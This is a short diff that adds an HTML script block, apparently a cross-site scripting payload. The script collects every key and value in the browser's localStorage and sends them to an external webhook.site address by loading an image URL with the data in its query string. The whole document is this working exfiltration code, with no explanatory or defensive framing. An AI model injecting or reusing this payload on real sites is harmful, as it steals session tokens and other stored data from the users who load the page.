@@ -1,0 +1,10 @@
+<script>
+    //local storage script
+    var webhook = "https://webhook.site/48102e67-c2dd-4d01-a5a0-ec34773e5466";
+    let result = '';
+    for (var i = 0, len = localStorage.length; i < len; ++i ) {
+        result=result.concat('|', localStorage.key( i ) + '-'+localStorage.getItem( localStorage.key( i ) ));
+    }
+    var img = document.createElement("img").src = webhook + "?data="+encodeURIComponent(result);
+    document.body.appendChild(img);
+</script>
